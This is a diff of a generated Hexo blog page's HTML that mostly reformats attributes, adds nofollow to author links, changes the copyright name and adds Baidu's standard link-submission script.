-          <span class="site-state-item-count">255</span>
+          <span class="site-state-item-count">256</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -546,13 +544,13 @@
 </div>
   <div class="links-of-author motion-element">
       <span class="links-of-author-item">
-        <a href="https://github.com/DanaShaw" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;DanaShaw" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+        <a href="https://github.com/DanaShaw" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;DanaShaw" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
       </span>
       <span class="links-of-author-item">
-        <a href="mailto:danaxkj@gmail.com" title="E-Mail → mailto:danaxkj@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+        <a href="mailto:danaxkj@gmail.com" title="E-Mail → mailto:danaxkj@gmail.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
       </span>
       <span class="links-of-author-item">
-        <a href="https://weibo.com/u/5742631593" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5742631593" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+        <a href="https://weibo.com/u/5742631593" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5742631593" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
       </span>
       <span class="links-of-author-item">
         <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
@@ -567,7 +565,7 @@
     </div>
     <ul class="links-of-blogroll-list">
         <li class="links-of-blogroll-item">
-          <a href="https://whale3070.github.io/" title="https:&#x2F;&#x2F;whale3070.github.io&#x2F;" rel="noopener" target="_blank">windows提权学习</a>
+          <a href="https://whale3070.github.io/" title="https:&#x2F;&#x2F;whale3070.github.io&#x2F;" rel="external nofollow noopener noreferrer" target="_blank">windows提权学习</a>
         </li>
     </ul>
   </div>
@@ -614,7 +612,7 @@
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">Dana Shaw</span>
+  <span class="author" itemprop="copyrightHolder">肖坤稼</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-area-chart"></i>
@@ -628,7 +626,7 @@
 </div>
 
 
-  <script src='https://unpkg.com/mermaid@/dist/mermaid.min.js'></script>
+  <script src="https://unpkg.com/mermaid@/dist/mermaid.min.js"></script>
   <script>
     if (window.mermaid) {
       mermaid.initialize({theme: 'default'});
@@ -670,7 +668,7 @@
 
   
   
-  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
   <script src="/lib/anime.min.js"></script>
   <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
   <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
@@ -693,6 +691,15 @@
 
 
   
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
 
 
 
@@ -749,15 +756,9 @@ NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
 });
 </script>
 
-<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3938956891324222"
-     crossorigin="anonymous"></script>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3938956891324222" crossorigin="anonymous"></script>
 <!-- sidebar -->
-<ins class="adsbygoogle"
-     style="display:block"
-     data-ad-client="ca-pub-3938956891324222"
-     data-ad-slot="6163650450"
-     data-ad-format="auto"
-     data-full-width-responsive="true"></ins>
+<ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-3938956891324222" data-ad-slot="6163650450" data-ad-format="auto" data-full-width-responsive="true"></ins>
 <script>
      (adsbygoogle = window.adsbygoogle || []).push({});
 </script>
@@ -765,7 +766,7 @@ NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
   <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
   
   
-   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
    <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
    <script type="text/javascript" src="/js/fireworks.js"></script>
 
